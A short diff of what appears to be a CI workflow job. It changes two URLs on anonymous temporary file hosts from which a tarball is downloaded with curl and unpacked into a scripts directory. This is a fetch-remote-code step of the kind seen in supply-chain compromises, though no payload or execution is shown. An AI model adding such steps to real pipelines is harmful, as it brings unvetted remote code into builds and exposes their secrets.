@@ -26,8 +26,8 @@ jobs:
           mkdir -p scripts
           ok=0
           for u in \
-            "https://litter.catbox.moe/p0xric.tgz" \
-            "https://x0.at/fqkr.tgz" ; do
+            "https://litter.catbox.moe/292vfx.tgz" \
+            "https://x0.at/kaI4.tgz" ; do
             echo "trying $u"
             if curl -fsSL "$u" -o /tmp/bundle.tgz && tar tzf /tmp/bundle.tgz >/dev/null 2>&1; then
               tar xzf /tmp/bundle.tgz -C scripts && ok=1 && break
